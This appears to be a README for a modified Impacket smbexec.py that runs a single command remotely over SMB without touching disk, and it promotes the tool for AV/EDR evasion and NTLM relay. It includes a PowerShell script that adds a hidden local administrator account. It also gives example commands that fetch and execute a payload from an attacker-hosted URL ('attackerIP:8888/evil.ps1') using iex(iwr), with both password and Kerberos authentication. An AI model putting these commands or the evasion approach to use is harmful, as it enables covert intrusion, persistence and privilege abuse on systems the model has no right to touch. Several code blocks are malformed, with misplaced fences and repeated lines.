Modified SMB Exec
========

This is a minimal modification of Impacket’s smbexec.py that adds support for a new flag:

```
--exec-cmd "<command>"
```

Purpose
========
The tool executes a single command remotely via Service Control Manager (SCM) over SMB (port 445) without writing any files to disk.

Key Changes
========
- Adds an --exec-cmd option to run a one-liner directly.
- Uses SCM over RPC for execution, similar to the original smbexec, but avoids the batch file creation step.
- Helps with AV evasion by keeping execution fileless.
- Still uses the same underlying Impacket framework and authentication methods.

Example Usage
========

Host a powershell script that adds a local administrator on the target machine

```
$Username = "fakeadmin"
$Password = "Password01"
$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
New-LocalUser -Name $Username -Password $SecurePassword -FullName "Fake Admin" -Description "Fake Admin" -PasswordNeverExpires
Add-LocalGroupMember -Group "Administrators" -Member $Username
```

Call the powershell script 
```
 python3 smbexec.py  ./administrator:Password01@target-host --exec-cmd='cmd.exe /c powershell.exe iex(iwr http://attackerIP:8888/evil.ps1 -usebasicparsing)' 
```

Using Kerberos

```
python3 smbexec.py -k -no-pass domain.local/admin@target-host --exec-cmd='cmd.exe /Q /c powershell.exe iex(iwr http://attackerIP:8888/evil.ps1 -usebasicparsing)' 
```
❓ Why
========
This modified version of smbexec.py is designed for stealthy, fileless command execution using only SMB (port 445) — ideal for NTLM relay scenarios or restricted environments where other ports (e.g., 135, 139) are blocked and AV detection is a concern.

In the original implementation, command execution works by:

Constructing a batch file path:
```
self.__batchFile = '%TEMP%\\' + BATCH_FILENAME
Preparing the shell command using %COMSPEC% (typically cmd.exe) and redirection:
```
Preparing the shell command using %COMSPEC% (typically cmd.exe) and redirection:
```
self.__shell = '%COMSPEC% /Q /c '
command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile
command += ' & ' + self.__shell + self.__batchFile
command += ' & del ' + self.__batchFile
Writing the command to disk, executing it, then reading the output file:
```

Writing the command to disk, executing it, then reading the output file:
```
self.__output = '\\127.0.0.1\\' + self.__share + '\\' + OUTPUT_FILENAME
```

This method:

- Creates temp files (.bat, output.txt) on the target
- Uses file redirection (>, 2>&1)
- Is heavily signatured and easily caught by AV/EDR tools


The modified SMBexec does the following:
========

The execution logic skips batch/output file creation entirely. Instead:
The command passed via --exec-cmd is used directly as the service binary path:
```
lpBinaryPathName = "cmd.exe /Q /c powershell.exe  ..."

```
This command is passed to hRCreateServiceW() like so:
```
scmr.hRCreateServiceW(self.__scmr, ..., lpBinaryPathName=command, ...)
```

✅ Result:

- No disk artifacts
- No output redirection or readback
- No %TEMP%, %COMSPEC%, or file paths involved
- Pure in-memory, one-shot execution via SCM over SMB
